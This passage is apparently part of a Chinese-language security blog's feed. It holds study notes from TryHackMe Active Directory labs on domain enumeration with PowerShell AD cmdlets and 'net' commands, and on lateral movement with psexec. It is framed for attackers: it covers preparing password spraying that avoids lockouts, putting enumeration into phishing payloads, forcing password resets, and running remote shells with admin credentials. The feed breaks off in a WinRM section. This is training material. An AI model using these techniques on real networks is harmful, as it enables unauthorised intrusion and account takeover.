+-Server - 由于我们没有加入域，因此我们必须使用此参数将其指向我们的域控制器&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240830202852.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;对于大多数这些 cmdlet，我们还可以使用 &lt;code&gt;-Filter&lt;/code&gt;  参数来对枚举进行更多控制，并使用 &lt;code&gt;Format-Table&lt;/code&gt;  cmdlet 整齐地显示结果，如下所示：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-ADUser&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Filter&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Name -like &#34;*stevens&#34;&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token punctuation&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;Format-Table&lt;/span&gt; Name&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;SamAccountName &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;A&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;Get-ADUser -Filter &#39;Name -like &amp;quot;*stevens&amp;quot;&#39; -Server za.tryhackme.com&lt;/code&gt; &lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-ADUser&lt;/code&gt; ：获取用户账户的 cmdlet。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-Filter &#39;Name -like &amp;quot;*stevens&amp;quot;&#39;&lt;/code&gt; ：使用筛选器来查找名称中包含 &amp;quot;stevens&amp;quot; 的用户。 &lt;code&gt;*&lt;/code&gt;  是通配符，表示在 &amp;quot;stevens&amp;quot; 前面可以有任何字符。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-Server za.tryhackme.com&lt;/code&gt; ：指定 Active Directory 服务器（在这里是  &lt;code&gt;za.tryhackme.com&lt;/code&gt; ）来执行查询。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt; &lt;code&gt;| Format-Table Name,SamAccountName -A&lt;/code&gt; &lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;|&lt;/code&gt; ：管道符号，用于将前面的命令结果传递给下一个命令。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Format-Table&lt;/code&gt; ：将结果格式化为表格形式。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Name,SamAccountName&lt;/code&gt; ：指定要在表格中显示的属性， &lt;code&gt;Name&lt;/code&gt;  是用户的全名， &lt;code&gt;SamAccountName&lt;/code&gt;  是用户的登录名（SAM 帐户名）。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-A&lt;/code&gt; （或  &lt;code&gt;-AutoSize&lt;/code&gt; ）：自动调整列宽，以便更好地显示数据。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;groups-团体&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#groups-团体&#34;&gt;#&lt;/a&gt; Groups 团体&lt;/h5&gt;
+&lt;p&gt;我们可以使用 &lt;code&gt;Get-ADGroup&lt;/code&gt;  cmdlet 来枚举 AD 组：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-ADGroup&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Identity Administrators &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Properties &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;还可以使用 &lt;code&gt;Get-ADGroupMember&lt;/code&gt;  cmdlet 枚举组成员身份：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-ADGroupMember&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Identity Administrators &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Properties &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240830203845.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;h5 id=&#34;ad-objects&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ad-objects&#34;&gt;#&lt;/a&gt; AD Objects&lt;/h5&gt;
+&lt;p&gt;可以使用 &lt;code&gt;Get-ADObject&lt;/code&gt;  cmdlet 对任何 AD 对象执行更通用的搜索。例如，如果我们正在查找在特定日期之后更改的所有 AD 对象：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$ChangeDate&lt;/span&gt; = &lt;span class=&#34;token function&#34;&gt;New-Object&lt;/span&gt; DateTime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;2022&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 02&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 28&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 12&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 00&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; 00&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-ADObject&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Filter&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;whenChanged -gt $ChangeDate&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;includeDeletedObjects &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;-Filter &#39;whenChanged -gt $ChangeDate&#39;&lt;/code&gt; &lt;/strong&gt;：过滤器，用于找到  &lt;code&gt;whenChanged&lt;/code&gt;  属性（最后修改时间）晚于  &lt;code&gt;$ChangeDate&lt;/code&gt;  的对象。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;-includeDeletedObjects&lt;/code&gt; &lt;/strong&gt;：包括已删除的对象在内。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;-Server za.tryhackme.com&lt;/code&gt; &lt;/strong&gt;：指定 Active Directory 服务器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因此在我看来这个 AD 这个对象的更改的查看更像是一个相关的一个所有域中的更改状态，就是这些组或者账户或者计算机什么时候被做了什么操作。&lt;br /&gt;
+但是我们可以看到我们都是用 filter 进行了过滤。  都是根据据 get-adobject 这条命令之后得到的相关属性的某一个特性进行独特的过滤。&lt;br /&gt;
+*** 例如，如果我们想在不锁定帐户的情况下执行密码喷射攻击，我们可以使用它来枚举 badPwdCount 大于 0 的帐户，以避免这些帐户参与我们的攻击：&lt;/p&gt;
+&lt;p&gt;因为 &lt;code&gt;badPwdCount&lt;/code&gt;  是 Active Directory 用户对象的一个属性，表示用户帐户尝试登录时输入错误密码的次数。如果达到或超过设定的阈值，帐户可能会被锁定。记录的是输入错误的次数。&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-ADObject&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;Filter&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;badPwdCount -gt 0&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;找到相关输入次数的账户将其排除我们的密码喷射的范围账户之内.&lt;/p&gt;
+&lt;h5 id=&#34;domains-域名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#domains-域名&#34;&gt;#&lt;/a&gt; Domains 域名&lt;/h5&gt;
+&lt;p&gt;我们可以使用 &lt;code&gt;Get-ADDomain&lt;/code&gt;  来检索有关特定域的附加信息：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-ADDomain&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h5 id=&#34;更改ad对象&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更改ad对象&#34;&gt;#&lt;/a&gt; 更改 AD 对象&lt;/h5&gt;
+&lt;p&gt;AD -RSAT cmdlet 的优点在于，有些 cmdlet 甚至允许您创建新的或更改现有的 AD 对象。然而，我们对该网络的关注点是枚举。创建新对象或更改现有对象将被视为 AD 开发，稍后将在 AD 模块中介绍。&lt;br /&gt;
+但是，我们将通过使用 &lt;code&gt;Set-ADAccountPassword&lt;/code&gt;  cmdlet 强制更改 AD 用户的密码来展示此示例：&lt;br /&gt;
+相当于我感觉就是使用命令行去进去对于 ad 的一些更改工作，直接去修改内网相关配置权限.&lt;/p&gt;
+&lt;p&gt;这个 PowerShell 命令用于在 Active Directory 中更改用户  &lt;code&gt;gordon.stevens&lt;/code&gt;  的密码。详细解释如下：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Set-ADAccountPassword&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Identity gordon&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;stevens &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;OldPassword &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AsPlaintext &lt;span class=&#34;token string&#34;&gt;&#34;old&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;force&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;NewPassword &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;AsPlainText &lt;span class=&#34;token string&#34;&gt;&#34;new&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Force&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;Set-ADAccountPassword&lt;/code&gt; &lt;/strong&gt;：用于更改用户账户密码的 cmdlet。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;-Identity gordon.stevens&lt;/code&gt; &lt;/strong&gt;：指定要更改密码的用户账户（在这里是  &lt;code&gt;gordon.stevens&lt;/code&gt; ）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;-Server za.tryhackme.com&lt;/code&gt; &lt;/strong&gt;：指定 Active Directory 服务器来执行操作。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;-OldPassword (ConvertTo-SecureString -AsPlaintext &amp;quot;old&amp;quot; -Force)&lt;/code&gt; &lt;/strong&gt;：指定当前的旧密码。 &lt;code&gt;ConvertTo-SecureString&lt;/code&gt;  将密码字符串  &lt;code&gt;&amp;quot;old&amp;quot;&lt;/code&gt;  转换为安全字符串格式， &lt;code&gt;-Force&lt;/code&gt;  允许将明文密码转换为安全字符串。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt; &lt;code&gt;-NewPassword (ConvertTo-SecureString -AsPlainText &amp;quot;new&amp;quot; -Force)&lt;/code&gt; &lt;/strong&gt;：指定新密码。类似地，将  &lt;code&gt;&amp;quot;new&amp;quot;&lt;/code&gt;  转换为安全字符串格式。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;此命令会将用户  &lt;code&gt;gordon.stevens&lt;/code&gt;  的密码从  &lt;code&gt;&amp;quot;old&amp;quot;&lt;/code&gt;  更改为  &lt;code&gt;&amp;quot;new&amp;quot;&lt;/code&gt; ，通过指定的 Active Directory 服务器来执行这一操作。&lt;/p&gt;
+&lt;p&gt;**Benefits 好处&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PowerShell cmdlet 可以枚举比命令提示符中的 net 命令更多的信息。&lt;/li&gt;
+&lt;li&gt;我们可以指定服务器和域来使用未加入域的计算机上的 runas 执行这些命令。&lt;/li&gt;
+&lt;li&gt;我们可以创建自己的 cmdlet 来枚举特定信息。&lt;/li&gt;
+&lt;li&gt;我们可以使用 AD -RSAT cmdlet 直接更改 AD 对象，例如重置密码或将用户添加到特定组。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;**Drawbacks 缺点&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;与命令提示符相比，蓝队通常更多地监控 PowerShell 。&lt;/li&gt;
+&lt;li&gt;我们必须安装 AD-RSAT 工具或使用其他可能可检测的脚本进行 PowerShell 枚举。&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="枚举AD" />
+        <updated>2024-09-08T08:42:30.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-%E5%91%BD%E4%BB%A4%E6%9E%9A%E4%B8%BE/</id>
+        <title>AD域枚举信息-命令枚举</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-%E5%91%BD%E4%BB%A4%E6%9E%9A%E4%B8%BE/"/>
+        <content type="html">&lt;p&gt;有时，您只需要执行快速而肮脏的 AD 查找，而命令提示符会为您提供支持。当您可能无法访问系统的 RDP、防御者正在监控 PowerShell 的使用以及您需要通过远程访问木马 （RAT） 执行 AD 枚举时，可靠可靠的 CMD 非常方便。在网络钓鱼有效负载中嵌入几个简单的 AD 枚举命令甚至会有所帮助，以帮助您获取可以帮助您进行最终攻击的重要信息。&lt;/p&gt;
+&lt;p&gt;CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即  &lt;code&gt;net&lt;/code&gt; 。 &lt;code&gt;net&lt;/code&gt;  命令是一个方便的工具，用于枚举有关本地系统和 AD 的信息。我们将看看我们可以从这个位置列举出一些有趣的事情，但这不是一个详尽的列表 CMD 有一个内置命令，我们可以使用它来枚举有关 AD 的信息，即  &lt;code&gt;net&lt;/code&gt; 。 &lt;code&gt;net&lt;/code&gt;  命令是一个方便的工具，用于枚举有关本地系统和 AD 的信息。我们将看看我们可以从这个位置列举出一些有趣的事情，但这不是一个详尽的列表。&lt;/p&gt;
+&lt;h4 id=&#34;users-用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#users-用户&#34;&gt;#&lt;/a&gt; Users 用户&lt;/h4&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user /domain&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这将为我们返回所有 AD 用户，并有助于确定域的大小以进行进一步的攻击。我们还可以使用此子选项来枚举有关单个用户帐户的更多详细信息：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net user zoe.marshall /domain&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;** 注意：如果用户只是少数 AD 组的一部分，则此命令将能够向我们显示组成员身份。但是，通常，在超过十个组成员身份之后，该命令将无法列出所有成员身份。&lt;/p&gt;
+&lt;h4 id=&#34;groups-组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#groups-组&#34;&gt;#&lt;/a&gt; Groups 组&lt;/h4&gt;
+&lt;p&gt;我们可以使用  &lt;code&gt;net&lt;/code&gt;  命令通过使用  &lt;code&gt;group&lt;/code&gt;  子选项来枚举域的组：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group /domain&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这些信息可以帮助我们找到目标执行的特定目标群体。我们还可以通过在同一命令中指定组来枚举更多详细信息，例如组的成员身份：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net group &lt;span class=&#34;token string&#34;&gt;&#34;Tier 1 Admins&#34;&lt;/span&gt; /domain&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;password-policy-密码策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#password-policy-密码策略&#34;&gt;#&lt;/a&gt; Password Policy 密码策略&lt;/h4&gt;
+&lt;p&gt;可以使用  &lt;code&gt;net&lt;/code&gt;  命令通过使用  &lt;code&gt;accounts&lt;/code&gt;  子选项来枚举域的密码策略：&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;net accounts /domain&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;ul&gt;
+&lt;li&gt;保留的密码历史记录的长度。这意味着用户必须提供多少个唯一密码才能重复使用旧密码。&lt;/li&gt;
+&lt;li&gt;错误密码尝试的锁定阈值以及帐户将被锁定的时间长度。&lt;/li&gt;
+&lt;li&gt;密码的最小长度。&lt;/li&gt;
+&lt;li&gt;允许密码达到的最长期限，指示是否必须定期轮换密码。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果我们想对我们现在列举的其他用户帐户进行额外的密码喷洒攻击，这些信息可以使我们受益。它可以帮助我们更好地猜测在攻击中应该使用哪些单一密码，以及在冒着锁定帐户的风险之前我们可以运行多少次攻击。但是，应该注意的是，如果我们执行盲密码喷射攻击，我们无论如何都可能会锁定帐户，因为我们没有检查以确定该特定帐户在被锁定之前还剩下多少次尝试。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems&#34;&gt;net 相关命令&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;benefits-好处&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#benefits-好处&#34;&gt;#&lt;/a&gt; Benefits 好处&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;不需要额外的工具或外部工具，这些简单的命令通常不会受到 Blue 团队的监控。&lt;/li&gt;
+&lt;li&gt;我们不需要 GUI 来执行此枚举。&lt;/li&gt;
+&lt;li&gt;.&lt;br /&gt;
+VBScript 和其他通常用于网络钓鱼有效负载的巨集语言本身支持这些命令，因此在制作更具体的有效负载之前，它们可用于枚举有关 AD 域的初始信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Drawbacks 缺点&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;net&lt;/code&gt;  命令必须从已加入域的计算机上执行。如果计算机未加入域，它将默认为 WORKGROUP 域。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;net&lt;/code&gt;  命令可能无法显示所有信息。例如，如果用户是 10 个以上组的成员，则并非所有这些组都会显示在输出中。&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+        <category term="枚举AD" />
+        <updated>2024-09-08T08:42:14.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/09/08/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B/</id>
+        <title>横向移动-远程创建进程</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/09/08/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B/"/>
+        <content type="html">&lt;h2 id=&#34;psexec-执行程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#psexec-执行程序&#34;&gt;#&lt;/a&gt; Psexec 执行程序&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Ports:&lt;/strong&gt; 445/TCP (SMB)&lt;br /&gt;
+&lt;strong&gt; 端口：&lt;/strong&gt; 445/ TCP （ SMB ）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Required Group Memberships:&lt;/strong&gt; Administrators&lt;br /&gt;
+** 所需的组成员身份：管理员&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;多年来，Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。 Psexec 是众多 Sysinternals 工具之一，可以&lt;a href=&#34;https://docs.microsoft.com/en-us/sysinternals/downloads/psexec&#34;&gt;在此处&lt;/a&gt;下载。&lt;/p&gt;
+&lt;h5 id=&#34;psexec-的工作方式如下&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#psexec-的工作方式如下&#34;&gt;#&lt;/a&gt; psexec 的工作方式如下：&lt;/h5&gt;
+&lt;ol&gt;
+&lt;li&gt;Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.&lt;br /&gt;
+ 连接到 Admin$ 共享并上传服务二进制文件。 Psexec 使用 psexesvc.exe 作为名称。&lt;/li&gt;
+&lt;li&gt;Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with  &lt;code&gt;C:\Windows\psexesvc.exe&lt;/code&gt; .&lt;br /&gt;
+ 连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 &lt;code&gt;C:\Windows\psexesvc.exe&lt;/code&gt;  关联。&lt;/li&gt;
+&lt;li&gt;Create some named pipes to handle stdin/stdout/stderr.&lt;br /&gt;
+ 创建一些命名管道来处理 stdin/stdout/stderr。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;其实工作方式很明确了，就是通过一些通道或者一些东西来传输对应的命令。但是我们需要对面的管理员权限因此我们刚才的总基调就可以看到，我们只能使用域管理员和一些默认管理员&lt;br /&gt;
+进行一些管道的传输。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;要运行 psexec，我们只需提供远程主机所需的管理员凭据以及我们要运行的命令（为方便起见，  &lt;code&gt;psexec64.exe&lt;/code&gt;  可在 THMJMP2 的 &lt;code&gt;C:\tools&lt;/code&gt;  下找到）：&lt;br /&gt;
+只能对应的是管理员&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;psexec64.exe &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;MACHINE_IP &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; Administrator &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; Mypass123 &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; cmd.exe&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;使用-winrm-远程创建进程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用-winrm-远程创建进程&#34;&gt;#&lt;/a&gt; 使用 WinRM 远程创建进程&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Ports:&lt;/strong&gt; 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)&lt;br /&gt;
+&lt;strong&gt; 端口：&lt;/strong&gt; 5985/TCP (WinRM HTTP ) 或 5986/ TCP (WinRM HTTPS)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Required Group Memberships:&lt;/strong&gt; Remote Management Users&lt;br /&gt;
